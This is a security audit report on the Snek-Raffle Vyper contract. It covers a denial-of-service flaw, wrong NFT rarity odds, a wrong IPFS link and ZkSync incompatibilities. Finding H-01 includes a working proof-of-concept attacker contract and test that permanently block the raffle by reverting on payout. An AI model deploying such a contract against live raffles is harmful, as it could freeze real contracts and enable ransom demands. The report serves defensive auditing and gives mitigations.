# First Flight #11: Snek-Raffle - Findings Report

# Table of contents

- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
  - ### [H-01. Winner of any raffle can block the contract forever](#H-01)
- ## Medium Risk Findings
  - ### [M-01. Each NFT rarity have the same probabilities to be distributed](#M-01)
  - ### [M-02. Wrong IPFS link for `LEGEND_SNEK_URI`](#M-02)
- ## Low Risk Findings
  - ### [L-01. Chainlink VRF is not available on ZkSync](#L-01)
  - ### [L-02. ZkSync doesn't support the Vyper compiler version used](#L-02)

# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #11

### Dates: Mar 7th, 2024 - Mar 14th, 2024

[See more contest details here](https://www.codehawks.com/contests/cltd8lz860001y058i5ug72ko)

# <a id='results-summary'></a>Results Summary

### Number of findings:

- High: 1
- Medium: 2
- Low: 2

# High Risk Findings

## <a id='H-01'></a>H-01. Winner of any raffle can block the contract forever

### Relevant GitHub Links

https://github.com/Cyfrin/2024-03-snek-raffle/blob/main/contracts/snek_raffle.vy#L158

## Description

Once the raffle ends, `fulfillRandomWords` is called by the Oracle, a winner is selected, and fees collected during the raffle are sent to the winner. Since all variables are reset in `fulfillRandomWords`, if this function reverts, no more raffle is possible. The problem arises when the receiver is a smart contract that reverts when it receives coins, intentionally or due to using too much gas. This situation can lead to the raffle being blocked forever, resulting in a denial-of-service (DoS) attack.

```javascript
def fulfillRandomWords(request_id: uint256, random_words: uint256[MAX_ARRAY_SIZE]):
    index_of_winner: uint256 = random_words[0] % len(self.players)
    recent_winner: address = self.players[index_of_winner]
    self.recent_winner = recent_winner
    self.players = []
    self.raffle_state = RaffleState.OPEN
    self.last_timestamp = block.timestamp
    rarity: uint256 = random_words[0] % 3
    self.tokenIdToRarity[ERC721._total_supply()] = rarity
    log WinnerPicked(recent_winner)
    ERC721._mint(recent_winner, ERC721._total_supply())
@>    send(recent_winner, self.balance)
```

## Risk

**Likelyhood**: Medium

- Winner is contract that uses too much gas
- An attacker could use a contract that will revert if they want and ask for a ransom to prevent the contract from breaking

**Impact**: High

- Denial of service of all future raffles with no possiblity to recover.

## Proof of Concept

<details>

<summary>Malicious contract to write in `./tests/dos_contract.vy`</summary>

```python
# SPDX-License-Identifier: MIT
# @version ^0.4.0b1

owner: address
raffle: address

@deploy
@payable
def __init__(
    raffle_address: address
):
    self.raffle = raffle_address
    self.owner = msg.sender


# External Functions
@external
@payable
def attack(entrance_fee: uint256):
    raw_call(self.raffle, method_id("enter_raffle()"), value=entrance_fee)


@external
@payable
def __default__():
    if msg.sender == self.owner:
        pass
    else:
        raise "I'm evil"
```

</details>

<details>

<summary>PoC to add in `snek_raffle_test.py`</summary>

```python
def test_winner_dos_raffle(
    raffle_boa, entrance_fee, vrf_coordinator_boa
):

    dos_contract = boa.load("./tests/dos_contract.vy", raffle_boa)
    boa.env.set_balance(dos_contract.address, STARTING_BALANCE)
    dos_contract.attack(entrance_fee)
    boa.env.time_travel(seconds=INTERVAL + 1)
    raffle_boa.request_raffle_winner()
    vrf_coordinator_boa.fulfillRandomWords(0, raffle_boa.address)
```

</details>

## Recommended Mitigation

Keep track of each winner's balance and implement a withdrawal function to allow winners to collect their fees, rather than sending ether directly to winners.

# Medium Risk Findings

## <a id='M-01'></a>M-01. Each NFT rarity have the same probabilities to be distributed

### Relevant GitHub Links

https://github.com/Cyfrin/2024-03-snek-raffle/blob/main/contracts/snek_raffle.vy#L154

## Description

The winner of the Snek Raffle will receive an NFT. According to the documentation and variables at the top of the contract, here are the probabilities:

```
There are 3 NFTs that can be won in the snek raffle, each with varying rarity.

1. Brown Snek - 70% Chance to get
2. Jungle Snek - 25% Chance to get
3. Cosmic Snek - 5% Chance to get
```

However, in `fulfillRandomWords` during the distribution, the rarity is only chosen using a modulo 3 operation, which gives the same chance for each rarity to be assigned.

```python
def fulfillRandomWords(request_id: uint256, random_words: uint256[MAX_ARRAY_SIZE]):
    index_of_winner: uint256 = random_words[0] % len(self.players)
    recent_winner: address = self.players[index_of_winner]
    self.recent_winner = recent_winner
    self.players = []
    self.raffle_state = RaffleState.OPEN
    self.last_timestamp = block.timestamp
@>    rarity: uint256 = random_words[0] % 3
    self.tokenIdToRarity[ERC721._total_supply()] = rarity
    log WinnerPicked(recent_winner)
    ERC721._mint(recent_winner, ERC721._total_supply())
    send(recent_winner, self.balance)
```

## Risk

**Likelyhood**: High

- Every raffle.

**Impact**: High

- All NFTs will have the same probability of being assigned each rarity, breaking the concept of rarity where some NFTs should be rarer than others.

## Proof of Concept

- Simulate a large number of raffles and record the minted NFTs.
- Check the rarity for each existing NFT and verify that approximately one-third of them are assigned each rarity.

## Recommended Mitigation

Take into account each probability to define the rarity. Below is a possible solution:

```diff
def fulfillRandomWords(request_id: uint256, random_words: uint256[MAX_ARRAY_SIZE]):
    index_of_winner: uint256 = random_words[0] % len(self.players)
    recent_winner: address = self.players[index_of_winner]
    self.recent_winner = recent_winner
    self.players = []
    self.raffle_state = RaffleState.OPEN
    self.last_timestamp = block.timestamp
-    rarity: uint256 = random_words[0] % 3
+    rarity: uint256 = 3 # unexisting rarity to initialize
+    rarity_calc: uint256 = random_words[0] % 100
+    if rarity_calc > COMMON_RARITY - 1:
+        if rarity_calc > COMMON_RARITY + RARE_RARITY - 1:
+            rarity = LEGEND_RARITY
+        else:
+            rarity = RARE_RARITY
+    else:
+        rarity = COMMON_RARITY
    self.tokenIdToRarity[ERC721._total_supply()] = rarity
    log WinnerPicked(recent_winner)
    ERC721._mint(recent_winner, ERC721._total_supply())
    send(recent_winner, self.balance)
```

## <a id='M-02'></a>M-02. Wrong IPFS link for `LEGEND_SNEK_URI`

### Relevant GitHub Links

https://github.com/Cyfrin/2024-03-snek-raffle/blob/main/contracts/snek_raffle.vy#L56

## Description

The link towards the Metadata for NFTs distributed by the Raffle is stored on-chain and is constant. However, the URI for the Legend Snek refers to the image of the Jungle Snek and not the correct JSON metadata for Legendary Snek.

```python
@>LEGEND_SNEK_URI: public(constant(String[53])) = "ipfs://QmRujARrkux8nsUG8BzXJa8TiDyz5sDJnVKDqrk3LLsKLX"
```

## Risk

**Likelyhood**: Medium

- Every Legend Snek NFT won't have the right metadata.

**Impact**: Medium

- Metadata will be corrupted and the NFT won't be displayed in wallets and marketplace properly. If it is displayed, it would show the image of the Jungle Snek instead of the legendary one.
- A new contract will have to be redeployed.

## Proof of Concept

Check the IPFS link provided and verify that it is pointing to the image of Jungle Snek.

## Recommended Mitigation

Replace the incorrect IPFS link with the correct one pointing to the JSON metadata for the Legend Snek.

# Low Risk Findings

## <a id='L-01'></a>L-01. Chainlink VRF is not available on ZkSync

## Description

The Snek Raffle relies on the Chainlink Oracle to obtain a random number and select the winner. While the project is intended for deployment on Ethereum, Arbitrum, and ZkSync, Chainlink has not deployed its protocol on the ZkSync chain. Consequently, this will prevent the raffle from being deployed on ZkSync.

For more information, refer to the [Chainlink documentation](https://docs.chain.link/vrf/v2/subscription/supported-networks).

## Risk

**Likelyhood**:

- Occurs with every deployment on ZkSync

**Impact**:

- Inability to deploy a version compatible with ZkSync or potential unexpected behavior on-chain

## Recommended Mitigation

Consider utilizing a different Oracle solution on ZkSync, such as API3.

## <a id='L-02'></a>L-02. ZkSync doesn't support the Vyper compiler version used

## Description

The version of Vyper utilized in this project is v0.4.0b1, intended for deployment on Ethereum, Arbitrum, and ZkSync. However, ZkSync employs a specific compiler called zkvyper to generate adapted bytecode for its zkEVM. Notably, the only supported Vyper versions for ZkSync are 0.3.3, 0.3.9, and 0.3.10.

For further information, refer to the [ZkSync official documentation](https://docs.zksync.io/zk-stack/components/compiler/toolchain/vyper.html#usage)

## Risk

**Likelyhood**:

- Occurs with every deployment on ZkSync

**Impact**:

- Inability to compile a version suitable for ZkSync or potential unexpected behavior on-chain

## Recommended Mitigation

Consider waiting for a more recent version to be supported by ZkSync or utilize a Vyper version compatible with ZkSync: 0.3.3, 0.3.9, or 0.3.10.
